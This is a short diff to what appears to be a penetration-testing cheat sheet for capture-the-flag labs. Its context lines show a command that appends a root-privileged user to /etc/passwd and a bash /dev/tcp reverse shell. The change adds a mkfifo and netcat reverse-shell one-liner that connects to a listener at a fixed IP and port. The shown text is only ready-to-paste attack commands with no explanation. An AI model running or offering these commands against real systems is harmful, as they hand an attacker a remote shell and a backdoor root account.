@@ -208,7 +208,10 @@ echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd
 ```
 bash -i >& /dev/tcp/your_thm_ip/some_port_to_listen_on 0>&1;
 ```
-
+- One line rm reverse shell
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.5.198 8888 >/tmp/f
+```
 
 ## Netcat
 ```
